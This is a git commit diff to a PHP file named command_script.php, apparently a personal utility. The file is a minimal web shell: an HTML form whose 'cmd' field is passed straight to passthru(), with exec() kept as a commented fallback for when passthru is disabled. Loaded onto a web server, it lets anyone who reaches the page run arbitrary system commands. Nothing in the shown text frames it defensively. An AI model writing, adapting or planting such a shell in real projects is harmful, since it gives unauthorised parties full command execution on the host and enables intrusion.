9fca775e200d98d0eba5e271f58dc9626794c4be
tomtomgunner <tomtomgunner@hotmail.co.uk>
2015-08-13 11:11:24 +0100

    Update command_script.php

--- command_script.php
+++ command_script.php
@@ -1,6 +1,10 @@
 <?php
 echo "<form action=command_script.php method=POST><input type=text name=cmd /></form>";
-echo htmlspecialchars(exec($_POST["cmd"]));
+echo htmlspecialchars(passthru($_POST["cmd"]));
+//
+// echo htmlspecialchars(exec($_POST["cmd"]));
+// use if passthru is disabled
+//
 // echo exec($_POST["cmd"]);
 // uncomment if you do not want to HTML encode the output (e.g. if trying to view other html pages) 
 ?>
